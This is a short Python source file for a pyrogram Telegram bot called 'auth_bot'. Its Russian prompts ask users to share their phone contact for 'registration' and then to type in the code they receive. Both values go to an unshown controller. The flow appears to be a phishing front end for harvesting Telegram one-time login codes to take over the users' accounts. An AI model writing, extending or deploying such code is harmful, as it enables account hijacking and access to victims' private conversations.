from settings import settings
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message
from controller import controller


app = Client("auth_bot", api_id=settings.api_id, api_hash=settings.api_hash,
             bot_token=settings.bot_token)


def state_filter(state):
    async def func(flt, _, message):
        print(user_states)
        return user_states.get(message.from_user.id, 'unknown') == flt.state
    return filters.create(func, state=state)


user_states = {}


@app.on_message(filters.text & state_filter('unknown'))
async def start(client, message):
    user_states[message.from_user.id] = 'unknown'
    await message.reply(text='Для регистрации предоставьте данные аккаунта', reply_markup=ReplyKeyboardMarkup(
                [
                    [KeyboardButton('Предоставить контакты', request_contact=True)]
                ],
                resize_keyboard=True
            )
    )
    user_states[message.from_user.id] = 'sent_contact'


@app.on_message(filters.contact)
async def handle_contact(client, message):
    await controller.phone_handle(message.contact.phone_number)
    await message.reply(text='Введите полученный код')
    user_states[message.from_user.id] = 'sent_code'


@app.on_message(state_filter('sent_code'))
async def handle_code(client, message: Message):
    await controller.code_handle(message.text)

app.run()
